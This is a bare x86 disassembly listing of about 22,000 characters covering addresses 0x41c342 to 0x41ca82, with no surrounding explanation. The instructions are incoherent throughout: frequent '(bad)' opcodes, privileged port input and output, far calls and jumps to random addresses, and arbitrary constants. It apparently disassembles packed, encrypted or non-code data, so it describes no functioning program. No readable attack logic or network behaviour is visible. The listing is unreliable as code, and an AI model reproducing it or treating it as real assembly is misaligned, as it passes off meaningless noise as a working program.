  41c342:	sub    bh,BYTE PTR [eax-0x49]
  41c345:	mov    dh,0x6
  41c347:	sub    DWORD PTR ds:0x4d1b3cfa,edx
  41c34d:	(bad)
  41c351:	lock mov edi,0xdae8f63c
  41c357:	lods   al,BYTE PTR ds:[esi]
  41c358:	aad    0x58
  41c35a:	dec    ebx
  41c35b:	mov    bl,0xdf
  41c35d:	rol    DWORD PTR [esi],1
  41c35f:	adc    BYTE PTR [edi+ebx*4],0x5a
  41c363:	dec    esi
  41c364:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c365:	cdq    
  41c366:	push   0xfa0d33fc
  41c36b:	dec    ebx
  41c36c:	or     eax,0x7ee0408f
  41c371:	push   ds
  41c372:	add    al,0x1
  41c374:	dec    ebx
  41c375:	push   edi
  41c376:	das    
  41c377:	pop    ds
  41c378:	retf   0x5956
  41c37b:	shr    BYTE PTR [esi],0x96
  41c37e:	mov    cl,0x16
  41c380:	add    BYTE PTR [ecx+0x27c7fab7],ah
  41c386:	ja     0x41c3b7
  41c388:	sub    bl,ch
  41c38a:	push   edi
  41c38b:	jne    0x41c402
  41c38d:	(bad)  
  41c38e:	and    DWORD PTR [ebx],eax
  41c390:	je     0x41c3d2
  41c392:	addr16 fsub st(1),st
  41c395:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c396:	fs and edx,ebx
  41c399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c39a:	dec    ecx
  41c39b:	push   0x55
  41c39d:	xchg   esp,eax
  41c39e:	dec    edi
  41c39f:	mov    BYTE PTR [edi+ebx*2-0x52],ch
  41c3a3:	mov    gs,ecx
  41c3a5:	fstp   DWORD PTR [ebp+0x3ac61ab8]
  41c3ab:	call   0x563d7abb
  41c3b0:	les    ecx,FWORD PTR [edi-0x49b8fa48]
  41c3b6:	mov    DWORD PTR [ebx],eax
  41c3b8:	out    dx,al
  41c3b9:	sub    cl,cl
  41c3bb:	call   0xe8a:0xe1eeeb6f
  41c3c2:	sub    ecx,DWORD PTR [edx-0x3fd15800]
  41c3c8:	inc    esi
  41c3c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ca:	and    DWORD PTR [ebx],esp
  41c3cc:	cmp    al,0x30
  41c3ce:	xor    ebp,DWORD PTR [edi-0x2c]
  41c3d1:	or     ch,BYTE PTR fs:[esp+ecx*1+0x5b]
  41c3d6:	ja     0x41c457
  41c3d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3d9:	out    dx,eax
  41c3da:	fdivr  DWORD PTR ds:0xf4c78e58
  41c3e0:	mov    cl,0x3b
  41c3e2:	iret   
  41c3e3:	in     eax,0xa0
  41c3e5:	cld    
  41c3e6:	loope  0x41c3b2
  41c3e8:	mov    cl,0x8b
  41c3ea:	bound  esi,QWORD PTR [edi+0x49]
  41c3ed:	pop    ebp
  41c3ee:	adc    al,0xf2
  41c3f0:	(bad)  
  41c3f2:	jne    0x41c426
  41c3f4:	out    dx,eax
  41c3f5:	dec    ebx
  41c3f6:	loopne 0x41c3c2
  41c3f8:	retf   
  41c3f9:	jl     0x41c3f5
  41c3fb:	pop    ss
  41c3fc:	xor    al,0x6d
  41c3fe:	pop    esp
  41c3ff:	ss adc ch,dl
  41c402:	lock lock or BYTE PTR gs:[ebx+0x93b9363],al
  41c40b:	push   0xffffffed
  41c40d:	or     eax,0xae6f8f7e
  41c412:	js     0x41c411
  41c414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c415:	jmp    0xcafaafd8
  41c41a:	stos   DWORD PTR es:[edi],eax
  41c41b:	fld    QWORD PTR [esi]
  41c41d:	dec    edi
  41c41e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c41f:	xor    BYTE PTR [eax+0x16b778b5],0x3b
  41c426:	cdq    
  41c427:	sbb    DWORD PTR [edx],ecx
  41c429:	std    
  41c42a:	dec    edx
  41c42b:	xlat   BYTE PTR ds:[ebx]
  41c42c:	sbb    DWORD PTR [edx+eax*4-0x2bd25812],esi
  41c433:	adc    cl,BYTE PTR [edi-0x5]
  41c436:	sub    al,0x31
  41c438:	push   ebp
  41c439:	push   0x1d
  41c43b:	push   eax
  41c43c:	sahf   
  41c43d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c43e:	(bad)  
  41c43f:	enter  0x3c76,0xbf
  41c443:	sub    ebx,edi
  41c445:	pop    ecx
  41c446:	adc    bh,BYTE PTR [eax-0x67ecc85b]
  41c44c:	(bad)  
  41c44d:	add    al,0xfd
  41c44f:	call   0xe95bb931
  41c454:	(bad)  
  41c455:	aas    
  41c456:	nop
  41c457:	push   esi
  41c458:	xchg   ebp,eax
  41c459:	dec    eax
  41c45a:	or     BYTE PTR [edx],bl
  41c45c:	imul   edx,DWORD PTR [ecx+0x20],0xdc18b799
  41c463:	cmp    edx,0xb487e1fa
  41c469:	cwde   
  41c46a:	or     dh,BYTE PTR [ebx]
  41c46c:	in     al,dx
  41c46d:	scas   eax,DWORD PTR es:[edi]
  41c46e:	xchg   ebx,eax
  41c46f:	inc    ebp
  41c470:	xchg   edx,eax
  41c471:	ret    0x6138
  41c474:	rcl    ch,cl
  41c476:	xchg   ebx,eax
  41c477:	lock mov ch,0x27
  41c47a:	jmp    0x815a6de8
  41c47f:	mov    dh,BYTE PTR [ebx]
  41c481:	enter  0xe6b2,0x80
  41c485:	inc    edx
  41c486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c487:	push   cs
  41c488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c489:	sahf   
  41c48a:	push   ss
  41c48b:	xchg   ebp,eax
  41c48c:	in     al,0x69
  41c48e:	pop    eax
  41c48f:	sahf   
  41c490:	sbb    eax,0x4137e539
  41c495:	jb     0x41c4ef
  41c497:	aas    
  41c498:	mov    DWORD PTR gs:[esi+0x1c6f5f60],ebx
  41c49f:	addr16 jns 0x41c4aa
  41c4a2:	repnz int3 
  41c4a4:	mov    WORD PTR [edi+0x59c207b],gs
  41c4aa:	sub    ebx,0x805cb72d
  41c4b0:	push   ecx
  41c4b1:	mov    bl,0x8e
  41c4b3:	adc    esi,ebp
  41c4b5:	enter  0xfeed,0x2b
  41c4b9:	out    dx,eax
  41c4ba:	arpl   WORD PTR [esi],bp
  41c4bc:	dec    esi
  41c4bd:	jb     0x41c46b
  41c4bf:	sbb    BYTE PTR [ebp+ecx*8-0x500f0ed5],ch
  41c4c6:	aas    
  41c4c7:	mov    ch,BYTE PTR [esp+eax*2+0x56]
  41c4cb:	test   BYTE PTR [esi-0x5581c472],ch
  41c4d1:	pop    esi
  41c4d2:	cmc    
  41c4d3:	int3   
  41c4d4:	cmp    ah,BYTE PTR [ebx+0x660ac6a9]
  41c4da:	or     BYTE PTR [esi-0x1e805039],dl
  41c4e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e1:	imul   edi,DWORD PTR [eax-0x3fb0e383],0xe4c14060
  41c4eb:	add    ecx,DWORD PTR [esi]
  41c4ed:	leave  
  41c4ee:	addr16 popaw 
  41c4f1:	dec    edi
  41c4f2:	inc    edi
  41c4f3:	test   al,0x1c
  41c4f5:	cmp    al,0x97
  41c4f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4f8:	mov    eax,ds:0xc3d5643b
  41c4fd:	outs   dx,DWORD PTR ds:[esi]
  41c4fe:	adc    DWORD PTR [edi-0x32],ecx
  41c501:	mov    edx,0x9b7aa8a
  41c506:	in     eax,dx
  41c507:	jo     0x41c579
  41c509:	dec    ecx
  41c50a:	pop    es
  41c50b:	adc    al,0x45
  41c50d:	xlat   BYTE PTR ds:[ebx]
  41c50e:	sub    ebp,DWORD PTR [edi+0x77]
  41c511:	arpl   WORD PTR [ebp-0x9],sp
  41c514:	(bad)  
  41c515:	outs   dx,BYTE PTR ds:[esi]
  41c516:	pusha  
  41c517:	mov    dh,0x81
  41c519:	pop    esi
  41c51a:	gs hlt 
  41c51c:	sar    DWORD PTR [ebx],cl
  41c51e:	jl     0x41c4b8
  41c520:	fs je  0x41c4fa
  41c523:	shl    BYTE PTR [ebx+0x57],cl
  41c526:	enter  0xa767,0x3a
  41c52a:	dec    ebp
  41c52b:	dec    ebp
  41c52c:	inc    edi
  41c52d:	mov    esp,0x84a1179d
  41c532:	int    0x35
  41c534:	daa    
  41c535:	xchg   edi,eax
  41c536:	addr16 push ebp
  41c538:	ds sub al,bh
  41c53b:	xor    al,0x16
  41c53d:	dec    edx
  41c53e:	add    al,BYTE PTR [esi]
  41c540:	into   
  41c541:	(bad)  
  41c544:	inc    eax
  41c545:	adc    bl,0x5a
  41c548:	push   esi
  41c549:	dec    ecx
  41c54a:	sbb    DWORD PTR [ecx-0x65424e56],esp
  41c550:	xor    al,0xa9
  41c552:	mov    WORD PTR [edx-0x5cb0039e],?
  41c558:	mov    ds:0x2c98c09f,eax
  41c55d:	sahf   
  41c55e:	dec    ebx
  41c55f:	push   ss
  41c560:	fist   DWORD PTR [esi-0x2e]
  41c563:	call   0xf212:0xe9c3dbd
  41c56a:	repz lock repz mov al,0xae
  41c56f:	(bad)  
  41c570:	std    
  41c571:	rol    DWORD PTR [esi],0xfe
  41c574:	pusha  
  41c575:	sub    edi,DWORD PTR [eax]
  41c577:	jnp    0x41c562
  41c579:	mov    ah,0x18
  41c57b:	je     0x41c5d4
  41c57d:	les    edx,FWORD PTR [edi-0x74]
  41c580:	and    cl,BYTE PTR [esi+0x552a3845]
  41c586:	mov    bh,0x61
  41c588:	cmp    dl,BYTE PTR [ebp-0x3ab86c3d]
  41c58e:	dec    eax
  41c58f:	out    0x18,eax
  41c591:	or     al,bl
  41c593:	jle    0x41c5ee
  41c595:	pop    ebx
  41c596:	(bad)  
  41c597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c598:	or     ah,BYTE PTR [edx-0x317d9c18]
  41c59e:	gs cs scas eax,DWORD PTR es:[edi]
  41c5a1:	or     DWORD PTR [eax+0x4a4a7c56],esp
  41c5a7:	jp     0x41c585
  41c5a9:	ins    BYTE PTR es:[edi],dx
  41c5aa:	and    eax,0x1efa024
  41c5af:	test   ebp,ebp
  41c5b1:	jbe    0x41c598
  41c5b3:	push   ds
  41c5b4:	cmp    BYTE PTR [esi+0x31004600],dl
  41c5ba:	dec    edx
  41c5bb:	into   
  41c5bc:	iret   
  41c5bd:	repz mov al,ds:0x3c5322bb
  41c5c3:	lods   eax,DWORD PTR ds:[esi]
  41c5c4:	xlat   BYTE PTR ds:[ebx]
  41c5c5:	les    edi,FWORD PTR [edx+0x270f3a92]
  41c5cb:	mov    bh,0x5a
  41c5cd:	fnstenv [esi]
  41c5cf:	push   ebx
  41c5d0:	sub    bl,BYTE PTR [ebx]
  41c5d2:	neg    BYTE PTR [edi+0x72]
  41c5d5:	mov    BYTE PTR ds:0xace3aac7,dl
  41c5db:	aas    
  41c5dc:	xlat   BYTE PTR ds:[ebx]
  41c5dd:	pop    ds
  41c5de:	push   edx
  41c5df:	mov    DWORD PTR [ebx],ebp
  41c5e1:	lods   eax,DWORD PTR ds:[esi]
  41c5e2:	cmp    eax,0xeb28f40
  41c5e7:	push   esi
  41c5e8:	add    BYTE PTR [esi+0x555dc275],0x63
  41c5ef:	cmp    ebp,DWORD PTR ds:0xa5421c6f
  41c5f5:	pusha  
  41c5f6:	dec    ebp
  41c5f7:	cmp    ebx,edi
  41c5f9:	jg     0x41c5da
  41c5fb:	es inc esi
  41c5fd:	push   ebx
  41c5fe:	scas   eax,DWORD PTR es:[edi]
  41c5ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c600:	daa    
  41c601:	jbe    0x41c63a
  41c603:	ret    0x8842
  41c606:	imul   esp,DWORD PTR [eax+eax*4+0x30b4d008],0x22ea3f39
  41c611:	outs   dx,DWORD PTR ds:[esi]
  41c612:	mov    edi,0x8f94b52
  41c617:	jge    0x41c689
  41c619:	jmp    0xc109:0x94754ffa
  41c620:	and    esi,DWORD PTR [ebp+0x1ecba85e]
  41c626:	xchg   edx,eax
  41c627:	jnp    0x41c5b3
  41c629:	cmp    bl,BYTE PTR [edx+eax*2]
  41c62c:	enter  0x3220,0x7d
  41c630:	add    al,BYTE PTR [ebp+0x2732accd]
  41c636:	cmp    esi,DWORD PTR [eax-0x17f986be]
  41c63c:	iret   
  41c63d:	aaa    
  41c63e:	hlt    
  41c63f:	and    bl,BYTE PTR [ebx-0x29]
  41c642:	outs   dx,BYTE PTR ds:[esi]
  41c643:	dec    edi
  41c644:	and    al,0xb3
  41c646:	fbld   TBYTE PTR [edi]
  41c648:	rcr    BYTE PTR [edx-0x5b],cl
  41c64b:	call   DWORD PTR [ecx-0x1f331bf1]
  41c651:	dec    ebx
  41c652:	dec    ecx
  41c653:	xlat   BYTE PTR ds:[ebx]
  41c654:	sar    BYTE PTR [edi-0x6ee4e8f9],cl
  41c65a:	mov    bh,0x4b
  41c65c:	imul   esp,DWORD PTR ss:[edi-0x25],0xe7392d3f
  41c664:	or     esp,DWORD PTR [ebx]
  41c666:	daa    
  41c667:	fsub   st(4),st
  41c669:	cmp    edx,eax
  41c66b:	imul   eax,eax,0x3c
  41c66e:	mov    ebx,esi
  41c670:	fild   DWORD PTR [edi-0x46]
  41c673:	popf   
  41c674:	xor    DWORD PTR [edx-0x18109905],esp
  41c67a:	mov    ah,0x34
  41c67c:	daa    
  41c67d:	and    eax,edi
  41c67f:	pop    ebx
  41c680:	test   ch,dh
  41c682:	pop    ebp
  41c683:	or     al,0x5b
  41c685:	test   bh,0xdd
  41c688:	shl    DWORD PTR [ecx-0x1ca3646b],0x65
  41c68f:	jo     0x41c6ff
  41c691:	cdq    
  41c692:	cmp    BYTE PTR [edx+0x4e],0x14
  41c696:	into   
  41c697:	mov    ah,0x6f
  41c699:	push   ds
  41c69a:	mov    esi,0x17d3528e
  41c69f:	jno    0x41c6c3
  41c6a1:	or     BYTE PTR [ebp+ebx*4-0x63c1341e],0xac
  41c6a9:	out    dx,al
  41c6aa:	call   0xeee3da0
  41c6af:	fcmovne st,st(6)
  41c6b1:	mov    dl,0x52
  41c6b3:	mov    ah,0xcc
  41c6b5:	push   cs
  41c6b6:	push   ss
  41c6b7:	clc    
  41c6b8:	dec    edi
  41c6b9:	into   
  41c6ba:	pushf  
  41c6bb:	aad    0x96
  41c6bd:	cmp    eax,0x61f9d49e
  41c6c2:	in     al,dx
  41c6c3:	sbb    eax,0xf0112207
  41c6c8:	fdiv   DWORD PTR ds:[esi-0x1d178b8b]
  41c6cf:	mov    al,ds:0x6695d076
  41c6d4:	sub    BYTE PTR [ecx],ah
  41c6d6:	push   esp
  41c6d7:	and    ebp,esp
  41c6d9:	ret    
  41c6da:	inc    ebx
  41c6db:	inc    ebx
  41c6dc:	hlt    
  41c6dd:	sbb    BYTE PTR [edi-0x6d],cl
  41c6e0:	xor    esi,DWORD PTR [ebx]
  41c6e2:	in     al,dx
  41c6e3:	outs   dx,DWORD PTR ds:[esi]
  41c6e4:	mov    ds:0xbd7aad6d,eax
  41c6e9:	fidiv  WORD PTR [ebx+0x7c]
  41c6ec:	iret   
  41c6ed:	fsub   st(6),st
  41c6ef:	lods   eax,DWORD PTR ds:[esi]
  41c6f0:	mov    DWORD PTR [esi],ebp
  41c6f2:	cmp    eax,0x39a0df3b
  41c6f7:	push   esp
  41c6f8:	cmp    edi,DWORD PTR [esi+0x1f106856]
  41c6fe:	xor    edx,DWORD PTR [edi-0x41]
  41c701:	mov    bl,0x82
  41c703:	adc    BYTE PTR [eax],cl
  41c705:	imul   edi,DWORD PTR [edi+0x15d13189],0x3a
  41c70c:	test   eax,0xfdcb765b
  41c711:	cmp    bl,BYTE PTR [ecx]
  41c713:	add    DWORD PTR [ebx],eax
  41c715:	ficomp DWORD PTR [esi]
  41c717:	jae    0x41c6d6
  41c719:	test   BYTE PTR [edx],dh
  41c71b:	cmp    esp,DWORD PTR [esi-0x7c5750cb]
  41c721:	mov    esp,0xde3050e7
  41c726:	imul   ebp,ebp,0x121696bd
  41c72c:	add    ebx,ebx
  41c72e:	xor    DWORD PTR [ebx],eax
  41c730:	sahf   
  41c731:	pop    eax
  41c732:	shr    DWORD PTR [edi-0x48ec58d],0x36
  41c739:	ror    ebx,1
  41c73b:	mov    eax,0xee5c7ba9
  41c740:	test   BYTE PTR [esi],dl
  41c742:	fs fsubp st(2),st
  41c745:	fdiv   st(4),st
  41c747:	test   eax,0x1415ef64
  41c74c:	xchg   ebx,eax
  41c74d:	aaa    
  41c74e:	pop    eax
  41c74f:	mov    ds:0xd538a1dd,al
  41c754:	or     eax,0xd839ec67
  41c759:	jns    0x41c72b
  41c75b:	dec    eax
  41c75c:	out    dx,al
  41c75d:	inc    ecx
  41c75e:	fsub   st,st(3)
  41c760:	stos   BYTE PTR es:[edi],al
  41c761:	adc    dl,bl
  41c763:	repnz es fs retf 
  41c767:	pusha  
  41c768:	stos   BYTE PTR es:[edi],al
  41c769:	xor    eax,0xdf3abd27
  41c76e:	xchg   ebx,eax
  41c76f:	fsubr  st(2),st
  41c771:	jmp    0x1ebcace3
  41c776:	out    dx,al
  41c777:	shl    DWORD PTR [edx+0xa],cl
  41c77a:	push   ds
  41c77b:	add    ch,bh
  41c77d:	dec    ebx
  41c77e:	ins    BYTE PTR es:[edi],dx
  41c77f:	out    dx,eax
  41c780:	or     DWORD PTR [edi+esi*8-0x12db0632],ecx
  41c787:	mov    bh,0xe4
  41c789:	shl    DWORD PTR [esi],cl
  41c78b:	xor    BYTE PTR [edx-0x76],al
  41c78e:	push   ebp
  41c78f:	retf   
  41c790:	fidivr WORD PTR ds:[ebx]
  41c793:	pop    esi
  41c794:	push   ds
  41c795:	inc    esi
  41c796:	push   ecx
  41c797:	push   ss
  41c798:	lock loopne 0x41c728
  41c79b:	cmp    DWORD PTR [eax+0xff5762e],ebx
  41c7a1:	xchg   BYTE PTR [ebp+edi*2+0x4f],al
  41c7a5:	sbb    dh,dh
  41c7a7:	inc    ebx
  41c7a8:	push   0x5a
  41c7aa:	mov    ah,ch
  41c7ac:	mov    ebp,0x5786ba3d
  41c7b1:	test   ch,0xb8
  41c7b4:	iret   
  41c7b5:	pop    ecx
  41c7b6:	in     eax,dx
  41c7b7:	adc    eax,0x10a1727e
  41c7bc:	push   edx
  41c7bd:	cmp    al,0x81
  41c7bf:	sbb    DWORD PTR [edi-0x25],ebx
  41c7c2:	fisubr DWORD PTR [edi]
  41c7c4:	js     0x41c7c6
  41c7c6:	cmc    
  41c7c7:	icebp  
  41c7c8:	sub    esi,esp
  41c7ca:	adc    ebx,esi
  41c7cc:	inc    esp
  41c7cd:	popa   
  41c7ce:	dec    ebx
  41c7cf:	add    eax,0xbd93ec94
  41c7d4:	inc    esi
  41c7d5:	out    0xc0,eax
  41c7d7:	push   ss
  41c7d8:	ret    0xec7e
  41c7db:	aas    
  41c7dc:	sbb    edi,ecx
  41c7de:	mov    ds:0x3d8d9852,al
  41c7e3:	fbstp  TBYTE PTR ds:0x4186574a
  41c7e9:	fdiv   QWORD PTR [eax+0x66]
  41c7ec:	dec    bp
  41c7ee:	jno    0x41c79c
  41c7f0:	int3   
  41c7f1:	add    BYTE PTR [edx],bl
  41c7f3:	push   ebx
  41c7f4:	mov    ds:0x19b7f31e,al
  41c7f9:	unpcklps xmm4,XMMWORD PTR [ecx+0x4e]
  41c7fd:	imul   edx,edi,0x49
  41c800:	popa   
  41c801:	xor    al,0x89
  41c803:	test   al,0xe3
  41c805:	cmp    eax,0x94d308d
  41c80a:	sti    
  41c80b:	add    eax,0x7f2f67c3
  41c810:	loope  0x41c7ac
  41c812:	out    0xae,al
  41c814:	jmp    0x3043:0xf35abe76
  41c81b:	add    al,0xda
  41c81d:	lock pop ds
  41c81f:	mov    ds:0xf9fefb57,eax
  41c824:	outs   dx,BYTE PTR ds:[esi]
  41c825:	sti    
  41c826:	inc    ecx
  41c827:	lods   eax,DWORD PTR ds:[esi]
  41c828:	sub    DWORD PTR [ecx+0x33c13cfd],esp
  41c82e:	adc    dh,cl
  41c830:	pop    ebp
  41c831:	jnp    0x41c828
  41c833:	fldenv [ebx+0xd]
  41c836:	mov    dh,al
  41c838:	pop    ebx
  41c839:	jecxz  0x41c82a
  41c83b:	xchg   ebx,eax
  41c83c:	jnp    0x41c7fc
  41c83e:	scas   eax,DWORD PTR es:[edi]
  41c83f:	xchg   esi,eax
  41c840:	dec    ebx
  41c841:	push   ss
  41c842:	jnp    0x41c829
  41c844:	fdivp  st(2),st
  41c846:	inc    eax
  41c847:	mov    bl,0xdf
  41c849:	mov    ah,0xb8
  41c84b:	and    DWORD PTR [eax],edi
  41c84d:	mov    edx,ds
  41c84f:	jp     0x41c848
  41c851:	clc    
  41c852:	jl     0x41c7f1
  41c854:	inc    edx
  41c855:	or     eax,0x13d68763
  41c85a:	fcomp  QWORD PTR [ebx-0x2e]
  41c85d:	imul   ebp,ebp,0xb450ef36
  41c863:	sbb    bh,dl
  41c865:	or     BYTE PTR [ebx+0x4676ea77],dl
  41c86b:	inc    eax
  41c86c:	dec    edx
  41c86d:	test   al,0xe
  41c86f:	push   0x512722b4
  41c874:	test   DWORD PTR [ebx+0x2f0c5ba0],0xe8b10efa
  41c87e:	ds stos DWORD PTR es:[edi],eax
  41c880:	out    dx,al
  41c881:	fistp  QWORD PTR [edx+0x16]
  41c884:	mov    ch,0x12
  41c886:	es mov ebp,0xd5ad5c04
  41c88c:	in     al,dx
  41c88d:	ret    0xb340
  41c890:	fsub   QWORD PTR [esi+0x16]
  41c893:	jns    0x41c8c9
  41c895:	mov    eax,0xa4a08cfb
  41c89a:	xchg   esi,eax
  41c89b:	push   eax
  41c89c:	addr16 adc bl,cl
  41c89f:	jno    0x41c8eb
  41c8a1:	xchg   ebx,eax
  41c8a2:	retf   0xb731
  41c8a5:	mov    dh,0xa2
  41c8a7:	data16 or al,0x52
  41c8aa:	imul   DWORD PTR [eax]
  41c8ac:	xchg   edi,eax
  41c8ad:	jecxz  0x41c86f
  41c8af:	ret    0xa594
  41c8b2:	fcmovu st,st(5)
  41c8b4:	in     al,dx
  41c8b5:	mov    bl,BYTE PTR [edx+0x3b]
  41c8b8:	add    eax,0x5effcc10
  41c8bd:	mov    ah,0x60
  41c8bf:	dec    edi
  41c8c0:	sbb    dl,BYTE PTR [ebp+eax*1+0x47]
  41c8c4:	pop    esp
  41c8c5:	std    
  41c8c6:	inc    ebx
  41c8c7:	pusha  
  41c8c8:	in     eax,0x13
  41c8ca:	mov    dl,0x18
  41c8cc:	mov    ss,WORD PTR [ecx+0x21]
  41c8cf:	or     ch,BYTE PTR [bx+si+0x4106]
  41c8d4:	dec    eax
  41c8d5:	jle    0x41c918
  41c8d7:	es cmp eax,0xdc6e460d
  41c8dd:	scas   al,BYTE PTR es:[edi]
  41c8de:	xor    eax,esi
  41c8e0:	into   
  41c8e1:	fisttp WORD PTR [edx+0x66]
  41c8e4:	in     al,dx
  41c8e5:	fidivr DWORD PTR [esi+0xcbcdd9c]
  41c8eb:	gs adc edx,ecx
  41c8ee:	in     eax,dx
  41c8ef:	jne    0x41c8d8
  41c8f1:	inc    ebx
  41c8f2:	js     0x41c933
  41c8f4:	js     0x41c954
  41c8f6:	outs   dx,DWORD PTR ds:[esi]
  41c8f7:	stc    
  41c8f8:	and    ch,BYTE PTR [edx]
  41c8fa:	in     al,dx
  41c8fb:	popf   
  41c8fc:	rcr    BYTE PTR [esi+esi*8],cl
  41c8ff:	cmc    
  41c900:	cmp    bl,al
  41c902:	shl    DWORD PTR [edi-0x15d563a1],0x3b
  41c909:	sub    BYTE PTR [edx-0x7f],bh
  41c90c:	adc    edi,DWORD PTR [esi]
  41c90e:	aas    
  41c90f:	sub    eax,0xc7f12c2
  41c914:	sahf   
  41c915:	mov    eax,0xb3b2d1f6
  41c91a:	cmp    BYTE PTR [ecx+0x3c591bf9],dl
  41c920:	sub    edx,DWORD PTR [ecx]
  41c922:	fbld   TBYTE PTR [edi]
  41c924:	xchg   edx,eax
  41c925:	add    eax,0x3d90ac35
  41c92a:	push   edi
  41c92b:	sbb    bl,BYTE PTR [esi]
  41c92d:	jp     0x41c8d7
  41c92f:	mov    edx,DWORD PTR [ebx]
  41c931:	or     ch,bl
  41c933:	cmp    eax,0x50d65299
  41c938:	(bad)  ds:0xbe9a274c
  41c93e:	mov    al,ds:0x4a50ddba
  41c943:	mov    cl,0xd6
  41c945:	mov    cs,edi
  41c947:	push   ss
  41c948:	je     0x41c92a
  41c94a:	enter  0xf785,0xff
  41c94e:	mov    esi,0xb842ba69
  41c953:	fisubr WORD PTR [esi+eiz*2+0x12]
  41c957:	fwait
  41c958:	std    
  41c959:	xchg   esp,eax
  41c95a:	inc    ebp
  41c95b:	(bad)
  41c95e:	in     al,dx
  41c95f:	mov    DWORD PTR [ebx+0x74],ebp
  41c962:	ins    DWORD PTR es:[edi],dx
  41c963:	jo     0x41c963
  41c965:	push   0x4ce6d1c2
  41c96a:	pop    ds
  41c96b:	mov    eax,0xb9cc3897
  41c970:	in     al,dx
  41c971:	pop    eax
  41c972:	stos   BYTE PTR es:[edi],al
  41c973:	sbb    ecx,0xedb001a8
  41c979:	mov    BYTE PTR [esi],ch
  41c97b:	mov    ebp,0xbb21579a
  41c980:	(bad)  
  41c981:	pop    es
  41c982:	cmp    BYTE PTR [edi+0x15cb7653],dh
  41c988:	cmp    cl,BYTE PTR [edx-0x11]
  41c98b:	aaa    
  41c98c:	pushf  
  41c98d:	gs cmp al,0x13
  41c990:	or     BYTE PTR cs:[eax+0x1df9c59c],bh
  41c997:	rol    DWORD PTR [esi-0x1f],1
  41c99a:	sub    BYTE PTR [ebx],ah
  41c99c:	lods   al,BYTE PTR ds:[esi]
  41c99d:	jbe    0x41ca1e
  41c99f:	sub    BYTE PTR [eax+0x5a53d8a0],cl
  41c9a5:	and    BYTE PTR es:[edi],dl
  41c9a8:	pop    ecx
  41c9a9:	lods   eax,DWORD PTR ds:[esi]
  41c9aa:	jo     0x41c945
  41c9ac:	clc    
  41c9ad:	lahf   
  41c9ae:	cmp    BYTE PTR ds:0xbeac5da,0x36
  41c9b5:	xchg   ebx,eax
  41c9b6:	test   BYTE PTR [edx-0x640611f5],bl
  41c9bc:	push   ebp
  41c9bd:	xchg   esi,eax
  41c9be:	shl    ecx,cl
  41c9c0:	push   0xddc1d55
  41c9c5:	push   0x26
  41c9c7:	loopne 0x41c9fe
  41c9c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9ca:	jb     0x41c980
  41c9cc:	push   ecx
  41c9cd:	js     0x41c9d1
  41c9cf:	nop
  41c9d0:	loop   0x41c9d7
  41c9d2:	push   ss
  41c9d3:	ja     0x41c9b7
  41c9d5:	cmp    al,0xff
  41c9d7:	xchg   edi,eax
  41c9d8:	adc    eax,0x851c67fd
  41c9dd:	dec    esp
  41c9de:	sub    DWORD PTR [edi+0x4c],0xffffffcb
  41c9e2:	cmp    DWORD PTR [eax],edi
  41c9e4:	add    BYTE PTR [edx-0x713ea4c2],cl
  41c9ea:	mov    bh,0xa2
  41c9ec:	iret   
  41c9ed:	adc    al,0xbd
  41c9ef:	cli    
  41c9f0:	mov    al,0xef
  41c9f2:	mov    DWORD PTR ds:0x7d53b595,ebx
  41c9f8:	fcomp  DWORD PTR [edi+eax*2+0x9]
  41c9fc:	(bad)  
  41c9fd:	jmp    0x8c99ab99
  41ca02:	call   0xf5d2:0x1d54b2d1
  41ca09:	push   es
  41ca0a:	cmp    eax,0x5ee144e
  41ca0f:	jb     0x41ca1a
  41ca11:	or     bl,BYTE PTR [esi+0x17]
  41ca14:	cmp    eax,0x2d27f577
  41ca19:	adc    BYTE PTR [ebx+0x6e],dh
  41ca1c:	outs   dx,DWORD PTR ds:[esi]
  41ca1d:	out    dx,eax
  41ca1e:	xchg   edx,eax
  41ca1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca21:	add    al,BYTE PTR [eax+0x5e4e4b53]
  41ca27:	sub    al,0x7e
  41ca29:	test   al,0x49
  41ca2b:	mov    dl,0x57
  41ca2d:	clc    
  41ca2e:	shl    BYTE PTR [edx+0x20],1
  41ca31:	push   cs
  41ca32:	dec    eax
  41ca33:	adc    eax,0x2b3f6a73
  41ca38:	aam    0x49
  41ca3a:	ret    
  41ca3b:	dec    ebp
  41ca3c:	fist   DWORD PTR [ecx-0x70]
  41ca3f:	adc    DWORD PTR [ebp-0x49],ecx
  41ca42:	in     eax,dx
  41ca43:	and    DWORD PTR [ebp+0x59],eax
  41ca46:	inc    eax
  41ca47:	and    BYTE PTR [ebx-0x6e60c9f2],ch
  41ca4d:	sti    
  41ca4e:	and    eax,0xfadb288b
  41ca53:	add    al,0x8e
  41ca55:	inc    eax
  41ca56:	mov    WORD PTR [edx+0x12],cs
  41ca59:	ds xchg ebp,eax
  41ca5b:	outs   dx,DWORD PTR ds:[esi]
  41ca5c:	add    edx,edi
  41ca5e:	fwait
  41ca5f:	cmp    dh,al
  41ca61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca62:	adc    ebp,ebx
  41ca64:	(bad)  
  41ca65:	fsubr  DWORD PTR [ebx]
  41ca67:	or     al,0x37
  41ca69:	xor    al,0x65
  41ca6b:	icebp  
  41ca6c:	mov    ebp,0x95f48eda
  41ca71:	add    dl,BYTE PTR [ecx-0x2f4667e]
  41ca77:	mov    BYTE PTR ds:0x6c97e3a,0xc7
  41ca7e:	iret   
  41ca7f:	adc    al,BYTE PTR [edx+0x18]
  41ca82:	pop    edx
